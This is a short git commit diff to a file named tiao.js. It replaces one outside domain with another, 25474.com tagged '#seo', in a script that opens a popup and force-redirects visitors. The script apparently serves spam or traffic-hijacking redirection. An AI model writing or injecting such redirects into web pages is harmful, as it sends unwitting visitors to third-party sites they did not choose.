e8f10aa1ac3d99dcf9012f3e57ad1326499f9c62
nidongdeaaa <nidongdeaaa@outlook.com>
2015-12-05 16:57:52 +0800

    Update tiao.js

--- qw1z/tiao.js
+++ qw1z/tiao.js
@@ -1,2 +1,3 @@
- window.open ("http://556.io/#w2-baidu"); 
- window.location.href="http://556.io/#w2-baidu";
+ window.open ("http://25474.com/#seo"); 
+ 
+ window.location.href="http://25474.com/#seo";
